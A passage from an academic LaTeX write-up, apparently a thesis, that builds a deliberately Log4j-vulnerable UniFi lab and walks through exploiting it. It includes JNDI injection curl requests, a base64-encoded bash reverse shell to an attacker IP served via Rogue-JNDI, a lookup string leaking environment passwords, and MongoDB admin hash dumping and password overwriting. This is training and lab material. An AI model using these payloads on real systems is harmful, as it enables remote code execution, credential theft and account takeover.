imageName}.${sys:user.home}.${sys:user.name}.${sys:java.vm.version}.${k8s:cont
ainerName}.${spring:spring.application.name}.${env:HOSTNAME}.${env:HOST}.${ctx
:loginId}.${ctx:hostName}.${env:PASSWORD}.${env:MYSQL_PASSWORD}.${env:POSTGRES
_PASSWORD}.${main:0}.${main:1}.${main:2}.${main:3}}
\end{lstlisting}

\subsection{Scenario Construction} \label{sec:validation_log4j_scenario_construction}

This scenario was based on the Tier 2 Unified Hack The Box\footnote{\url{https://www.hackthebox.com/}} challenge and in the \textit{SprocketSecurity} blog post \cite{sprocketsecurity_ref}, essentially reproducing a vulnerable version of the Ubiquiti UniFi network application dashboard. This works as an interface manager for all the hardware devices belonging to the mesh network allowing the changing of several network-related configurations. To replicate the scenario, we used Goofball222's GitHub UniFi Docker container repository\footnote{\url{https://github.com/goofball222/unifi}}. We opted for using version 6.4.54 and tweaked a bit the Dockerfile suited for Alpine-based distributions by installing the \texttt{python3} package
and removing the \texttt{JVM\_EXTRA\_OPTS=-Dlog4j2.formatMsgNoLookups\\=true} environment variable that disables variable lookups, which was turning the network application to be not vulnerable to Log4j exploit. It's also important to refer that this configuration uses a MongoDB database that supports the UniFi Network Application, where users are saved.

% CA
At first we could not get an HTTPS connection with UniFi's dashboard as a default CA certificate was generated by an untrusted CA. Therefore, it was time to create our Certificate Authority that was responsible for issuing the signed public-key digital certificates associated with a predefined domain name. By turning our create CA into trusted in the target device, it was possible to achieve an HTTPS connection. Listing \ref{lst:cmd_commands_unifi_ca} presents the commands that were used to create the CA's key pair, generating a CSR with the \textit{subjectAltName} extension, and getting the final public-key certificate signed by the new root CA, as well as the private key's password protection removed:

\lstset{
  language=bash,
  basicstyle=\ttfamily,
  showstringspaces=false,
  commentstyle=\color{red},
  keywordstyle=\color{blue}
}

\begin{lstlisting}[language=bash,caption=Generating an SSL Certificate for UniFi's dashboard.,numbers=none,label={lst:cmd_commands_unifi_ca}]
#!/bin/bash

# Generate CA keys (private and public keys)
openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -keyout ca.key -out ca.crt

# Generating Certificate Signing Request (notice the subjectAltName which is mandatory, at least in Firefox!)
openssl req -newkey rsa:2048 -sha256 -keyout server.key -out server.csr -subj "/CN=example-domain.ui.com/O=UniFi/C=US" -passout pass:pass -addext "subjectAltName = DNS:example-domain.ui.com"

# Generate Server Public-key Certificate
openssl ca -config openssl.cnf -policy policy_anything -md sha256 -days 3650 -in server.csr -out server.crt -batch -cert ca.crt -keyfile ca.key

# Remove Password from server's private key
openssl rsa -in server.key -out server_nopass.key
\end{lstlisting}

The steps to load the certificates into the Docker container were as follows:

\begin{enumerate}
    \item Map the certificates folder path to the \texttt{/usr/lib/unifi/cert} volume exposed by the container.
    \item Insert in the certificates folder the PEM format SSL private key file corresponding to the SSL certificate under the name of \texttt{privkey.pem}.
    \item Insert also in the certificates folder the PEM format SSL certificate with the full certificate chain. under the name of \texttt{fullchain.pem}.
\end{enumerate}

The private key file belonging to UniFi's dashboard domain was obtain in the last command form Listing \ref{lst:cmd_commands_unifi_ca}. The full chain file is simply a concatenation of the public-key certificates of the CA and the \texttt{example-domain.ui.com} domain. 

Furthermore, changes in the entry point scripts were made to always reload SSL certificates inside the Docker container. This was not the default behaviour as the Docker image was previously configured to issue a file with the hashes of the files in the certificates folder and check for their existence.

% Entrypoint Script

After the creation of the above mentioned SSL certificates, there is the need of including the newly created root CA's public-key certificate in the attacker machine so it can be considered trustworthy. This way, when the trainee visits the UniFi dashboard, the website appears as a legitimate HTTPS connection. This setup is presented in Listing  achieved with the following entry point script:

\begin{lstlisting}[language=bash,caption=Entrypoint Bash Script.,numbers=none,label={lst:log4j_entrypoint_script}]
#!/bin/bash

cd "$( dirname "$0" )"

# UniFi Wizard Setup 

sleep 10
pip install -r requirements.txt
python3 setup.py

# Load new trusted root CA

cp /setup/ca.crt /usr/local/share/ca-certificates
update-ca-certificates

# Also in Firefox-Esr

cat policies.json > /usr/lib/firefox-esr/distribution/policies.json
\end{lstlisting}

Every template file is within the scenario's \texttt{setup} folder. Firstly, we run a \textit{python} script that will be promptly explained. Then, we copy the root CA's public-key certificate into a special \texttt{ca-certificates} folder and run the \texttt{update-ca-certificates} command which turns our newly placed root CA certificate as system-wide trusted. So, every digital certificate signed by this new root CA will be deemed as safe. After this, we need Firefox browser to also consider this CA as safe. So we copied the \texttt{policies.json} file into a special folder.

\begin{lstlisting}[caption=Firefox's Policies File.,numbers=none,label={lst:firefox_json_policies}]
{
    "policies": {
      "Certificates": {
        "ImportEnterpriseRoots": true,
        "Install": [
          "ca.crt",
          "/setup/ca.crt"
        ]
      }
    }
  }
\end{lstlisting}

Listing \ref{lst:firefox_json_policies} presents the policies file which is read on every Firefox's new execution.

% Selenium

After loading the SSL certificates we obtained the desired effect, an HTTPS connection when loading UniFi's dashboard. Still, there was a slight problem. When hitting the dashboard's web page for the first time, the initial wizard setup was shown. We had to overcome this by creating a Selenium script (\textit{setup.py} shown in Listing \ref{lst:log4j_entrypoint_script}) for this effect using Firefox's \textit{WebDriver} as a way to remotely instruct the behavior of the browser. The tasks performed by Selenium can summarized in:

\begin{itemize}
    \item Visiting UniFi's web dashboard page.
    \item Setting administrator credentials for accessing UniFi's web page. These were specified in the YAML format as custom variables of the vulnerable service in the scenario's specific variables.
    \item Clicking several wizard setup buttons to move onto more advanced setup stages.
\end{itemize}

\subsection{Exploit} \label{sec:validation_log4j_exploit}

The goal of the Log4j exploit on UniFi's software is to obtain a reverse shell, get the secret flag, and leverage access to get the administrative credentials on the UniFi MongoDB instance.

Initially we can dig a little into the reconnaissance process and check which ports are open by default in the victim machine using \texttt{nmap}. We can see port 8443 which is where UniFi's interface is in.

\begin{lstlisting}[caption=Nmap output over victim machine.,numbers=none,label={lst:nmap_victim}]
# nmap -Pn example-domain.ui.com
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 18:52 UTC
Nmap scan report for example-domain.ui.com (172.152.0.1)
Host is up (0.000034s latency).
rDNS record for 172.152.0.1: edge_router.external_net
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
443/tcp  open  https
8443/tcp open  https-alt
MAC Address: 02:42:AC:98:00:01 (Unknown)
 
Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
\end{lstlisting}

Then, we access the \texttt{https://example-domain.ui.com:8443} domain and get the following page:

\begin{figure}[H]
    \includegraphics[width=15cm]{figures/unifi_initial_dashboard.png}
    \caption{UniFi's initial dashboard.}
    \label{fig:log4j_unifi_initial_dashboard}
\end{figure}

As mentioned earlier, we need to target a field that we know it will be logged by Apache Log4j, using a malicious JNDI query. In our case it is the \texttt{remember} field of the POST request.

\begin{lstlisting}[caption=UniFi Dashboard POST Request.,numbers=none,label={lst:unifi_post_request}]
POST /api/login HTTP/1.1
Host: example-domain.ui.com:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage
Content-Type: application/json; charset=utf-8
Origin: https://example-domain.ui.com:8443
Content-Length: 76
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
 
{"username":"myuser","password":"mypassword","remember":false,"strict":true}
\end{lstlisting}

Then we need to test if the web application is vulnerable to the Log4j attack. First we listen for connections on port 9999 using \texttt{netcat} with: \texttt{nc -lnvp 9999}. From the example request of Listing \ref{lst:unifi_post_request} we only need to change the \texttt{remember} field to \texttt{\$\{jndi:ldap://172.152.0.2:9\\999/whatever\}} and issue the modified POST request:

\begin{lstlisting}[caption=Issuing Malicious POST Request.,numbers=none,label={lst:unifi_malicious_post_request}]
curl 'https://example-domain.ui.com:8443/api/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage' -H 'Content-Type: application/json; charset=utf-8' -H 'Origin: https://example-domain.ui.com:8443' -H 'Connection: keep-alive' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"username":"a","password":"a","remember":"${jndi:ldap://172.152.0.2:9999/whatever}","strict":true}'
\end{lstlisting}

As we get a connection to port 9999 from the vulnerable Log4j container it means the web application is indeed vulnerable to the exploit. Notice \texttt{172.152.0.2} is the attacker machine's IP address. The next step is to use the Rogue-JNDI GitHub tool\footnote{\url{https://github.com/veracode-research/rogue-jndi}} to obtain a reverse shell on the target. Essentially, this tool sets up a malicious LDAP and HTTP server for JNDI injection attacks. When the tool first receives a connection from the vulnerable client, to connect to the local LDAP server, it responds with a malicious entry containing a payload that will be useful to achieve a Remote Code Execution. The steps to build upon this foundation are to stage an LDAP Referral Server that will redirect the initial client request of the victim to an HTTP server where a secondary payload is hosted that will eventually run code on the target. 

The procedures to setup the exploit include first using \texttt{netcat} to listen for inbound connections on port 4444 with the command \texttt{nc -lnvp 4444} and then following the steps of Listing \ref{lst:unifi_clone_rogue_jndi}:

\begin{enumerate}
    \item Clone the Rogue JNDI tool and build the project into a JAR file using Maven.
    \item Generate the Base64 payload that will run in the victim's server. It connects to the attacker machine on port 4444, redirecting both the standard input and standard output to the remote machine so the attacker can have full control over the victim.
    \item Running Rogue JNDI tool to create malicious LDAP and HTTP server with command that will trigger a reverse shell.
    \item Issue cURL command with malicious JNDI query and run exploit.
\end{enumerate}

\begin{lstlisting}[language=bash,caption=Cloning Rogue JNDI GitHub Repository.,numbers=none,label={lst:unifi_clone_rogue_jndi}]
# Clone Rogue JNDI GitHub repository and build project
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package

# Create the Base64 payload 
echo 'bash -c bash -i >&/dev/tcp/172.152.0.2/4444 0>&1' | base64

# Running the malicious LDAP and HTTP Server with the Base64 malicious payload. The hostname flag denotes the target HTTP server.
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTcyLjE1Mi4wLjIvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "172.152.0.2"

# Running Exploit
curl 'https://example-domain.ui.com:8443/api/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage' -H 'Content-Type: application/json; charset=utf-8' -H 'Origin: https://example-domain.ui.com:8443' -H 'Connection: keep-alive' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"username":"a","password":"a","remember":"${jndi:ldap://172.152.0.2:1389/o=tomcat}","strict":true}'
\end{lstlisting}

As a result, we obtain a reverse shell in our initial \texttt{netcat} listener. We now have access to the target server under the \textit{unifi} user. Running a simple \texttt{ls -la} command we can see there is a weird file with the name \texttt{...} (3 dots). If we open it, we will find the challenge flag \texttt{flag\{l3ts\_un1f1\_every0ne\_l0g4j\}}.

\subsection{Post Exploitation} \label{sec:validation_log4j_post_exploitation}

Some lateral movement can be performed after getting the reverse shell on the victim. For instance, we can try to crack the administrative credentials for the UniFi network application stored in the MongoDB instance mentioned earlier in the Docker container construction using \texttt{hashcat}. Or, we can add add a new administrative user, for instance. In a real world setup, this would allow access to a whole new range of devices, possibly with some kind of vulnerabilities that would easily allow a way in. Persistence tasks could also be taken into account to allow consistent access to the victim machine.

After getting the reverse shell prompt, we can first check if there really is a MongoDB instance running. We can do this by running \texttt{ps aux | grep mongo}. The result will show port 27117 listening for incoming MongoDB connections. Then, we can check which databases are available and get the contents of the \textit{admin} database.

\begin{lstlisting}[caption=Fetching Contents of MongoDB Admin Collection.,numbers=none,label={lst:unifi_mongodb_admin_contents}]
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
MongoDB shell version v3.4.4
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.4.4
{
        "_id" : ObjectId("64750f87f19ea8014a2ceb6d"),
        "name" : "test_user",
        "email" : "admin@hotmail.com",
        "x_shadow" : "$6$msad4FLZ$WwZoWNYAGbcGY3bF8HVBQ.t.69dt/ogu1nsmeTjsorz4dBl3Q0Waoya35R.Gm0qEgPoVsUorIhVRVpoiG8cFo/",
        "time_created" : NumberLong(1685393287),
        "last_site_name" : "default"
}
\end{lstlisting}

Listing \ref{lst:unifi_mongodb_admin_contents} shows the existence of an administrator user named \textit{test\_user}, its email and the password hash of the user which can be seen in the \textit{x\_shadow} field. This is a SHA512 hash due to the \textit{\$6\$} characters at the start. As mentioned, it would be possible to crack this hash to get the provided password, however this could take a long time, so we opted for updating the current administrator's password. We first generate a SHA512 hash of the string ``mypassword'' using the command \texttt{mkpasswd -m sha-512 mypassword}. Lastly, the command on Listing \ref{lst:unifi_mongodb_update_admin_password} updates the administrator account password using the previously generated SHA 512 password.

\begin{lstlisting}[caption=Update Administrator User Account Password.,numbers=none,label={lst:unifi_mongodb_update_admin_password}]
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("64750f87f19ea8014a2ceb6d")},{$set:{"x_shadow":"$6$zsmtIX0rAM.G4P8a$TKt4eg15VC11zpQaCVS6nLHdOYOzlfjO5m3Tvle7rtc1SOvMRYTT0jBBnRc
CqY5lAOLDNst3xfGQdX99GtpD0."}})'
\end{lstlisting}

As we result, now the \textit{test\_user} account has the newly replaced password \textit{mypassword}.


